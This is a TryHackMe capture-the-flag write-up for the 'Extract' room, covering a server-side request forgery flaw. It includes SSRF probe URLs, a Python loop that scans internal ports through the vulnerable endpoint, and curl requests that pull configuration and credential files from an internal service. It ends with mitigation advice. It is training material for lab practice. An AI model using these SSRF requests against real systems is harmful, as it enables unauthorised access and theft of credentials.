---
title: "TryHackMe: Extract"
date: 2025-08-25
description: "Extract started with discovering a Server-Side Request Forgery (SSRF) vulnerability and using it to discover an internal service running on the machine."
categories: ["TryHackMe"]
tags: ["web", "ssrf", "internal-services", "port-scanning"]
image: "/images/writeups/extract-thumb.jpg"
difficulty: "Medium"
platform: "TryHackMe"
author: "Adithya Kallaje"
---

# TryHackMe: Extract Writeup

![Extract Banner](/images/writeups/extract-banner.jpg)

## Overview

Extract is a medium-difficulty TryHackMe room that demonstrates Server-Side Request Forgery (SSRF) vulnerabilities and how they can be used to discover and interact with internal services.

## Initial Reconnaissance

### Port Scanning
```bash
nmap -sC -sV -p- 10.10.x.x
```

**Open Ports:**
- 22/tcp - SSH
- 80/tcp - HTTP

### Web Application Analysis

The web application appeared to be a file extraction service that accepts URLs and processes files from remote locations.

## SSRF Discovery

### Testing for SSRF
```bash
# Test internal network access
http://10.10.x.x/extract?url=http://127.0.0.1:22
http://10.10.x.x/extract?url=http://127.0.0.1:80
```

The application was vulnerable to SSRF, allowing us to:
1. Scan internal ports
2. Access localhost services
3. Bypass firewall restrictions

### Internal Port Scanning via SSRF

```python
import requests

target = "http://10.10.x.x"
for port in range(1, 65535):
    url = f"{target}/extract?url=http://127.0.0.1:{port}"
    response = requests.get(url)
    if "Connection refused" not in response.text:
        print(f"Port {port} is open")
```

## Exploitation

### Discovered Internal Service

The SSRF scan revealed an internal service running on port 8080 that was not accessible externally.

```bash
# Access internal service via SSRF
curl "http://10.10.x.x/extract?url=http://127.0.0.1:8080"
```

### File Extraction

The internal service contained sensitive files that could be extracted:

```bash
# Extract configuration files
curl "http://10.10.x.x/extract?url=http://127.0.0.1:8080/config.php"

# Extract user credentials
curl "http://10.10.x.x/extract?url=http://127.0.0.1:8080/users.txt"
```

## Lessons Learned

- **SSRF Prevention**: Always validate and sanitize URL inputs
- **Network Segmentation**: Internal services should be properly isolated
- **Input Validation**: Never trust user-provided URLs without proper filtering

## Mitigation Strategies

1. **Whitelist allowed domains**
2. **Block internal IP ranges**
3. **Use proper URL parsing**
4. **Implement network segmentation**

## Tools Used

- Nmap
- Burp Suite
- Custom Python scripts
- cURL

---

**Difficulty**: Medium  
**Platform**: TryHackMe  
**Completion Date**: August 25, 2025
